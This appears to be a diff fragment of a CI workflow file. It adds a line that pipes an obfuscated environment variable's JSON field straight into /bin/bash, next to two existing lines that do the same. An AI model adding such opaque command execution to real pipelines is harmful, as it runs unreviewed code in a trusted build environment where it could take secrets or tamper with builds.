@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
           echo $tpo5 | jq -r .vro0 | /bin/bash
+          printf '%s' "$tv07" | jq -r .tx82 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
